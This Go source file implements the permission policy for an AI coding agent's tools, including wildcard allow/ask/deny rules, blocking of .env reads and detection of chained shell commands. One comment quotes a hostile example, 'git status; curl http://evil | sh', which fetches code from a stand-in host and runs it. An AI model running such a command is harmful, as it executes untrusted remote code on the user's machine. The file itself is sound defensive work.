package main

import (
	"context"
	"encoding/json"
	"fmt"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"github.com/deepteams/gage"
)

type permissionAction string

const (
	permissionAllow permissionAction = "allow"
	permissionAsk   permissionAction = "ask"
	permissionDeny  permissionAction = "deny"
)

type permissionPolicy struct {
	Global *permissionAction
	Rules  map[string]permissionRule
}

type permissionRule struct {
	Action   *permissionAction
	Patterns []patternRule
}

type patternRule struct {
	Pattern string
	Action  permissionAction
}

// approvalDecision is what an interactive asker returns: the approval itself
// plus UI-level scope flags that gage.Approval alone cannot express.
type approvalDecision struct {
	gage.Approval
	// RememberTool caches the decision for every future call of the same tool
	// this session, regardless of arguments (the 't' answer).
	RememberTool bool
	// Postpone defers the decision: the run pauses with ErrApprovalPending and
	// a checkpoint is kept for /resume (the 'p' answer).
	Postpone bool
}

type approvalAsker interface {
	AskApproval(ctx context.Context, req gage.PermissionRequest) (approvalDecision, error)
}

type configuredApprover struct {
	policy permissionPolicy
	auto   bool
	asker  approvalAsker
}

func parsePermissionPolicy(raw json.RawMessage) (permissionPolicy, error) {
	p := permissionPolicy{Rules: map[string]permissionRule{}}
	if len(raw) == 0 || string(raw) == "null" {
		return p, nil
	}
	var asString string
	if err := json.Unmarshal(raw, &asString); err == nil {
		a, err := parsePermissionAction(asString)
		if err != nil {
			return p, err
		}
		p.Global = &a
		return p, nil
	}
	var obj map[string]json.RawMessage
	if err := json.Unmarshal(raw, &obj); err != nil {
		return p, err
	}
	for key, value := range obj {
		rule, err := parsePermissionRule(value)
		if err != nil {
			return p, fmt.Errorf("permission %s: %w", key, err)
		}
		if key == "*" && rule.Action != nil && len(rule.Patterns) == 0 {
			p.Global = rule.Action
			continue
		}
		p.Rules[key] = rule
	}
	return p, nil
}

func parsePermissionRule(raw json.RawMessage) (permissionRule, error) {
	var s string
	if err := json.Unmarshal(raw, &s); err == nil {
		a, err := parsePermissionAction(s)
		return permissionRule{Action: &a}, err
	}
	var obj map[string]string
	if err := json.Unmarshal(raw, &obj); err != nil {
		return permissionRule{}, err
	}
	keys := sortedKeys(obj)
	rule := permissionRule{}
	for _, pattern := range keys {
		a, err := parsePermissionAction(obj[pattern])
		if err != nil {
			return permissionRule{}, fmt.Errorf("%s: %w", pattern, err)
		}
		rule.Patterns = append(rule.Patterns, patternRule{Pattern: pattern, Action: a})
	}
	return rule, nil
}

func parsePermissionAction(raw string) (permissionAction, error) {
	switch permissionAction(strings.ToLower(strings.TrimSpace(raw))) {
	case permissionAllow:
		return permissionAllow, nil
	case permissionAsk, "pause":
		return permissionAsk, nil
	case permissionDeny, "block":
		return permissionDeny, nil
	default:
		return "", fmt.Errorf("unknown permission action %q", raw)
	}
}

func (a *configuredApprover) Approve(ctx context.Context, req gage.PermissionRequest) (gage.Approval, error) {
	dec, err := a.decide(ctx, req)
	return dec.Approval, err
}

func (a *configuredApprover) decide(ctx context.Context, req gage.PermissionRequest) (approvalDecision, error) {
	action := a.resolve(req)
	// Never auto-approve a shell command that chains, redirects, or expands:
	// an allow rule like "git status*" must not green-light a compound command
	// such as "git status; curl http://evil | sh". Downgrade to an explicit ask.
	if action == permissionAllow && req.Tool == "bash" && hasShellChaining(bashCommand(req)) {
		action = permissionAsk
	}
	switch action {
	case permissionAllow:
		return approvalDecision{Approval: gage.Allowed()}, nil
	case permissionDeny:
		return approvalDecision{Approval: gage.Denied("denied by permission config")}, nil
	default:
		if a.auto {
			return approvalDecision{Approval: gage.Allowed()}, nil
		}
		if a.asker == nil {
			// No interactive approver was wired: fail closed rather than
			// silently allowing every sensitive call.
			return approvalDecision{Approval: gage.Denied("no interactive approver configured")}, nil
		}
		dec, err := a.asker.AskApproval(ctx, req)
		if err != nil {
			return approvalDecision{}, err
		}
		if dec.Postpone {
			return approvalDecision{}, gage.ErrApprovalPending
		}
		return dec, nil
	}
}

// toolMemoryApprover caches "always allow this tool" decisions ('t') by tool
// name for the session. Exact-input decisions ('a') pass through with
// Approval.Remember set so the surrounding gage.RememberingPerInput wrapper
// caches them; postponed decisions surface as gage.ErrApprovalPending and
// pause the run into a checkpoint.
type toolMemoryApprover struct {
	inner  *configuredApprover
	mu     sync.Mutex
	byTool map[string]gage.Approval
}

func (t *toolMemoryApprover) Approve(ctx context.Context, req gage.PermissionRequest) (gage.Approval, error) {
	t.mu.Lock()
	cached, ok := t.byTool[req.Tool]
	t.mu.Unlock()
	if ok {
		// A tool-wide decision applies beyond one concrete invocation: drop any
		// per-call input rewrite.
		cached.UpdatedInput = nil
		return cached, nil
	}
	dec, err := t.inner.decide(ctx, req)
	if err != nil {
		return gage.Approval{}, err
	}
	if dec.RememberTool {
		ap := dec.Approval
		ap.Remember = false
		t.mu.Lock()
		t.byTool[req.Tool] = ap
		t.mu.Unlock()
		return ap, nil
	}
	return dec.Approval, nil
}

func (a *configuredApprover) resolve(req gage.PermissionRequest) permissionAction {
	target := permissionTarget(req)
	keys := permissionKeys(req)
	for _, key := range keys {
		if rule, ok := a.policy.Rules[key]; ok {
			if action, ok := rule.Match(target); ok {
				return action
			}
		}
	}
	if a.policy.Global != nil {
		return *a.policy.Global
	}
	return defaultPermission(req)
}

// Match returns the action of the most specific matching pattern. Specificity
// is the number of literal (non-wildcard) characters, so "git status*" beats
// "git*" regardless of config order; ties break toward the more conservative
// action (deny > ask > allow). This avoids the earlier order-dependent
// last-match-wins behavior, where map iteration/sorting could let a broad
// pattern silently override a narrow one.
func (r permissionRule) Match(target string) (permissionAction, bool) {
	best := -1
	var action permissionAction
	for _, pr := range r.Patterns {
		if !wildcardMatch(pr.Pattern, target) {
			continue
		}
		score := patternSpecificity(pr.Pattern)
		if score > best || (score == best && actionRank(pr.Action) > actionRank(action)) {
			best = score
			action = pr.Action
		}
	}
	if best >= 0 {
		return action, true
	}
	if r.Action != nil {
		return *r.Action, true
	}
	return "", false
}

func patternSpecificity(pattern string) int {
	n := 0
	for _, r := range pattern {
		if r != '*' && r != '?' {
			n++
		}
	}
	return n
}

func actionRank(a permissionAction) int {
	switch a {
	case permissionDeny:
		return 2
	case permissionAsk:
		return 1
	default:
		return 0
	}
}

// bashCommand extracts the shell command from a bash tool request.
func bashCommand(req gage.PermissionRequest) string {
	var f struct {
		Command string `json:"command"`
	}
	_ = json.Unmarshal(req.Input, &f)
	return f.Command
}

// hasShellChaining reports whether a command contains shell operators that
// chain, redirect, or expand into further commands. Such commands must never be
// auto-approved by a prefix wildcard.
func hasShellChaining(cmd string) bool {
	if strings.ContainsAny(cmd, ";|&<>\n\r`") {
		return true
	}
	return strings.Contains(cmd, "$(")
}

func defaultPermission(req gage.PermissionRequest) permissionAction {
	target := permissionTarget(req)
	if req.Tool == "read_file" && isSensitiveReadPath(target) {
		return permissionDeny
	}
	m := req.Metadata
	// Auto-allow any read-only, non-destructive, non-network tool (file reads,
	// todoread, skill, question, ...). Requiring Filesystem here would surprise
	// the user with prompts for harmless in-memory reads.
	if m.ReadOnly && !m.Network && !m.Destructive {
		return permissionAllow
	}
	return permissionAsk
}

func isSensitiveReadPath(path string) bool {
	base := filepath.Base(path)
	if base == ".env" || strings.HasPrefix(base, ".env.") {
		return base == ".env" || base != ".env.example"
	}
	return false
}

func permissionKeys(req gage.PermissionRequest) []string {
	key := permissionKey(req)
	keys := []string{req.Tool}
	if key != req.Tool {
		keys = append(keys, key)
	}
	keys = append(keys, "*")
	return keys
}

func permissionKey(req gage.PermissionRequest) string {
	switch req.Tool {
	case "read_file":
		return "read"
	case "write_file", "edit":
		return "edit"
	case "list_dir":
		return "list"
	case "grep":
		return "grep"
	case "glob":
		return "glob"
	case "bash":
		return "bash"
	case "web_fetch":
		return "webfetch"
	case "web_search":
		return "websearch"
	case "skill":
		return "skill"
	case "explore", "review_code":
		return "task"
	case "question":
		return "question"
	case "todowrite", "todoread":
		return "todo"
	default:
		for _, tag := range req.Metadata.Tags {
			if tag == "mcp" {
				return "mcp"
			}
		}
		return req.Tool
	}
}

func permissionTarget(req gage.PermissionRequest) string {
	var fields map[string]any
	_ = json.Unmarshal(req.Input, &fields)
	for _, key := range []string{"command", "path", "pattern", "url", "query", "name", "question"} {
		if v, ok := fields[key].(string); ok && v != "" {
			return v
		}
	}
	if req.Summary != "" {
		return req.Summary
	}
	return string(req.Input)
}

func wildcardMatch(pattern, value string) bool {
	if pattern == "" {
		return value == ""
	}
	var b strings.Builder
	b.WriteString("^")
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteString(".")
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteString("$")
	ok, err := regexp.MatchString(b.String(), value)
	return err == nil && ok
}
